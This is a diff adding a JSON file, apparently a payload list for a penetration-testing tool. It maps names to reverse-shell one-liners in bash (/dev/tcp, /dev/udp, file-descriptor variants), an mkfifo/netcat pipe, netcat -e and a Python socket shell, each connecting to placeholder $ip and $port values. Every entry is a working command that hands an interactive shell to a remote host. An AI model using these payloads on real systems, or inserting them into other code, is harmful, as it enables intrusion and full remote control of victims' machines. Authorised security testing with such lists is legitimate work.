@@ -1,0 +1,9 @@
+{
+    "std":"bash -i >& /dev/tcp/$ip/$port 0>&1",
+    "mkfifo":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip $port >/tmp/f",
+    "bash_udp":"bash -i >& /dev/udp/$ip/$port 0>&1",
+    "bash_5":"bash -i 5<> /dev/tcp/$ip/$port 0<&5 1>&5 2>&5",
+    "bash_rl":"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do $line 2>&5 >&5; done",
+    "netcat":"nc -e /bin/sh $ip $port",
+    "python":"bash -c \"python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'\""
+}
